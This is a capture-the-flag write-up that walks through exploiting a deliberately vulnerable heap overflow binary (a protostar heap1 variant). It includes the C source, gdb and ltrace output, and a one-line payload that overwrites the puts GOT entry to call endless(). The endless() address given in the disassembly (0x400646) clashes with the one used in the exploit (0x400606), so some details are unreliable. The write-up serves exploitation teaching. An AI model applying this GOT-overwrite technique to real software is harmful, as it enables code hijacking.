This challenge is based off of a challenge from protostar (heap1 to be exact).

Let's take a look at the source code...

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct space	
{
	char* star; 
};

void endless()
{
	int i = 5;
	printf("Do you know how much research I could fit in space? I'll give you a hint, more than %d. Level Cleared\n", i);
}

int main(int argc, char **argv)
{
	if (argc != 3)
	{
		puts("You need two arguments in addition to the elf's name to research this.\n");
		exit(0);
	}
	struct space *sun, *moon;

	sun = malloc(sizeof(struct space));
	sun->star = malloc(10);

	moon = malloc(sizeof(struct space));
	moon->star = malloc(10);

	strcpy(sun->star, argv[1]);
	strcpy(moon->star, argv[2]);
	
	puts("Do you know what well rounded researchers like? They like space.\n");
}
```

So looking at this code, we can see a heap overflow vulnerabillity. It checks to make sure that the program takes three arguments (two arguments plus the name), then proceeds to copy the two arguments over to a place allocated in the heap via a malloc call. However it doesn't check to see how much data the strcpy calls are writing. The two places in memory that it is copying to have a static size of 10 bytes set. So we should the heap. 

We can see that in order to pwn this challenge, we have to run the endless() function. We see that we have the abillity to write twice to the heap, using addresses that point towards the heap. What we can do is overflow sun->star (like a buffer overflow) to overwrite the address of moon->star with that of the puts function using the first strcpy function. This way the second strcpy function would write over the address with an address that we want (such as the address of the endless function). Then when the program tries to run the puts function, it will just end up running whatever is stored at the addres we want. Let's find the offset, using a utillity called ltrace.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1_64$ ltrace ./h1_64 0000 1111
__libc_start_main(0x40066c, 3, 0x7fffffffdf58, 0x400730 <unfinished ...>
malloc(8)                                        = 0x602010
malloc(10)                                       = 0x602030
malloc(8)                                        = 0x602050
malloc(10)                                       = 0x602070
strcpy(0x602030, "0000")                         = 0x602030
strcpy(0x602070, "1111")                         = 0x602070
puts("Do you know what well rounded re"...Do you know what well rounded researchers like? They like space.
)      = 65
+++ exited (status 0) +++

```

So we can see here that our input is being stored at 0x602030 with the first strcpy, and to 0x602070 using the second strcoy. We can see here that there are four allocated places in the heap memory, one for each malloc call. We can see that the spaces at 0x602010 and 0x602050 only contain 8 bytes worth of data. This is because the size parameter that is handed to them is the size of the space struct, which the space struct only contains a pointer to a char (which is just an address pointing to a space) and addresses in 64 bit systems are 8 bytes long (even thought heap addresses fon't appear to occupy all of the space, so 0s are needed). So the only thing the sun and moon iterations of the space struct contain are a 8 byte address pointer. We also see that the pointers sun->space and moon-> space have 10 bytes allocated to them via a malloc call. Because of those malloc calls those pointers actually point to allocated space now. 

Also notice how the heap spaces outputted by the ltrace command match the order that the heap space is allocated via malloc calls in the program. This isn't a coincidence. When allocating space in the heap via malloc calls, the order of the spaces is determined by the order that the malloc calls are made. Now we made a lot of claims here, let's prove some of them using gdb. We will set a breakpoint for the printf (compiler changed it to puts) call in main (exact location shouldn't matter as long as it's past the corresponding malloc calls), and analyze the corresponding addresses to determine that sun->star and moon->star both contain a pointer to a memory address (which will be 0x602030 for sun->star and 0x602070 for moon->star). Also that the memory areas they point to contain our input.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x000000000040066c <+0>:	push   rbp
   0x000000000040066d <+1>:	mov    rbp,rsp
   0x0000000000400670 <+4>:	sub    rsp,0x20
   0x0000000000400674 <+8>:	mov    DWORD PTR [rbp-0x14],edi
   0x0000000000400677 <+11>:	mov    QWORD PTR [rbp-0x20],rsi
   0x000000000040067b <+15>:	cmp    DWORD PTR [rbp-0x14],0x3
   0x000000000040067f <+19>:	je     0x400695 <main+41>
   0x0000000000400681 <+21>:	mov    edi,0x400820
   0x0000000000400686 <+26>:	call   0x4004f0 <puts@plt>
   0x000000000040068b <+31>:	mov    edi,0x0
   0x0000000000400690 <+36>:	call   0x400530 <exit@plt>
   0x0000000000400695 <+41>:	mov    edi,0x8
   0x000000000040069a <+46>:	call   0x400520 <malloc@plt>
   0x000000000040069f <+51>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006a3 <+55>:	mov    edi,0xa
   0x00000000004006a8 <+60>:	call   0x400520 <malloc@plt>
   0x00000000004006ad <+65>:	mov    rdx,rax
   0x00000000004006b0 <+68>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006b4 <+72>:	mov    QWORD PTR [rax],rdx
   0x00000000004006b7 <+75>:	mov    edi,0x8
   0x00000000004006bc <+80>:	call   0x400520 <malloc@plt>
   0x00000000004006c1 <+85>:	mov    QWORD PTR [rbp-0x10],rax
   0x00000000004006c5 <+89>:	mov    edi,0xa
   0x00000000004006ca <+94>:	call   0x400520 <malloc@plt>
   0x00000000004006cf <+99>:	mov    rdx,rax
   0x00000000004006d2 <+102>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004006d6 <+106>:	mov    QWORD PTR [rax],rdx
   0x00000000004006d9 <+109>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004006dd <+113>:	add    rax,0x8
   0x00000000004006e1 <+117>:	mov    rdx,QWORD PTR [rax]
   0x00000000004006e4 <+120>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004006e8 <+124>:	mov    rax,QWORD PTR [rax]
   0x00000000004006eb <+127>:	mov    rsi,rdx
   0x00000000004006ee <+130>:	mov    rdi,rax
   0x00000000004006f1 <+133>:	call   0x4004e0 <strcpy@plt>
   0x00000000004006f6 <+138>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004006fa <+142>:	add    rax,0x10
   0x00000000004006fe <+146>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400701 <+149>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400705 <+153>:	mov    rax,QWORD PTR [rax]
   0x0000000000400708 <+156>:	mov    rsi,rdx
   0x000000000040070b <+159>:	mov    rdi,rax
   0x000000000040070e <+162>:	call   0x4004e0 <strcpy@plt>
   0x0000000000400713 <+167>:	mov    edi,0x400868
   0x0000000000400718 <+172>:	call   0x4004f0 <puts@plt>
   0x000000000040071d <+177>:	mov    eax,0x0
   0x0000000000400722 <+182>:	leave  
   0x0000000000400723 <+183>:	ret    
End of assembler dump.
gdb-peda$ b *main+172
Breakpoint 1 at 0x400718
gdb-peda$ r 7539 9517
```

One wall of text later...

```
Breakpoint 1, 0x0000000000400718 in main ()
gdb-peda$ x/w 0x602010
0x602010:	0x00602030
gdb-peda$ x/s 0x602030
0x602030:	"7539"
gdb-peda$ x/w 0x602050
0x602050:	U"\x602070"
gdb-peda$ x/s 0x602070
0x602070:	"9517"
```

So as you can see there, we showed that the spaces 0x602010 and 0x602050 contain pointers to spaces at 0x602030 and 0x602050 which contain our input. So for this exploit we will simply use the first strcpy to overflow the memory starting at 0x602030 to overwrite the pointer stored at 0x602050 of some other address, then we can rewrite the address with the second strcpy call to that of the endless function so we can pwn the challenge. Looking at the code, we see a call to printf after our two strcpy functions however looking at the assembly we can see that it is calling something else.

```
   0x0000000000400718 <+172>:	call   0x4004f0 <puts@plt>
```

Even though we have in our code to call the printf function, we are just printing text. We aren't printing any chars, pointers, integers or anything else. Since we aren't the compiler will just substitue in puts instead of printf, since puts is a simpler version of printf and will do it's job just fine. This actually works in our advantage since in the endless function, that printf call is actually printing an int. So the compiler will use printf instead of puts, so we won't run into an issue with trying to run a function that we overwritten to call the endless function and enter a loop that ends with the program crashing.

```
gdb-peda$ disas endless
Dump of assembler code for function endless:
   0x0000000000400646 <+0>:	push   rbp
   0x0000000000400647 <+1>:	mov    rbp,rsp
   0x000000000040064a <+4>:	sub    rsp,0x10
   0x000000000040064e <+8>:	mov    DWORD PTR [rbp-0x4],0x5
   0x0000000000400655 <+15>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400658 <+18>:	mov    esi,eax
   0x000000000040065a <+20>:	mov    edi,0x4007b8
   0x000000000040065f <+25>:	mov    eax,0x0
   0x0000000000400664 <+30>:	call   0x400500 <printf@plt>
   0x0000000000400669 <+35>:	nop
   0x000000000040066a <+36>:	leave  
   0x000000000040066b <+37>:	ret    
End of assembler dump.
```

As you can see there, my previous claim held true. Now the first step is figuring out the offset between the start of our input, and where the moon->star pointer is stored. Then we will have to come up with the address of puts, and endless. 

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1_64$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x602050 - 0x602030
32
>>> exit()
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1_64$ objdump -R h1_64 | grep puts
0000000000600bd8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1_64$ objdump -D h1_64 | grep endless
0000000000400606 <endless>:
```

So we have the offset which is 32, the address of puts which is 0x600bd8 (for this exploit, we can ignore the zeroes, and the binary will read it all the same), and the address of endless which is 0x400606. Now to craft the exploit to overflow the address (remember we have to push the hex strings using little endian still).

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h1_64$ ./h1_64 `python -c 'print "0"*32 + "\xd8\x0b\x60" + " " + "\x06\x06\x40"'` 
Do you know how much research I could fit in space? I'll give you a hint, more than 5. Level Cleared
```

Just like that we pwned the binary! 
